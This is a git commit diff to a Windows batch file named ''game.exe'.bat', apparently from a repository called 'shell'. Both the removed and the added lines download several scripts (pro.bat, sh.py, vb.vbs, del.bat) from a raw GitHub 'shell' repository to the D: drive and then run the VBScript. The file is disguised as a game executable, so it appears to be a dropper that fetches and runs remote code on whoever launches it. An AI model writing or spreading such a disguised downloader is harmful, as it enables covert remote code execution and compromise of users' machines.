94406e4d89672a89e60fc16daa661908183361e7
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-01 20:43:10 +0300

    Update 'game.exe'.bat

--- 'game.exe'.bat
+++ 'game.exe'.bat
@@ -1,16 +1,7 @@
 @echo off
-
-REM Download files
-curl -o D:\pro.bat https://raw.githubusercontent.com/0x2034/shell/main/pro.bat 
-curl -o D:\sh.py https://raw.githubusercontent.com/0x2034/shell/main/sh.py 
-curl -o D:\vb.vbs https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs 
-curl -o D:\del.bat https://raw.githubusercontent.com/0x2034/shell/main/del.bat 
-
-REM Execute VBScript
-start /wait wscript.exe D:\vb.vbs
-
-REM Clean up
-curl -o D:\del.bat https://raw.githubusercontent.com/0x2034/shell/main/del.bat 
-
-REM Exit script
+curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat 
+curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
+curl https://raw.githubusercontent.com/0x2034/shell/main/del.bat -o D:\del.bat
+call D:\vb.vbs
 exit
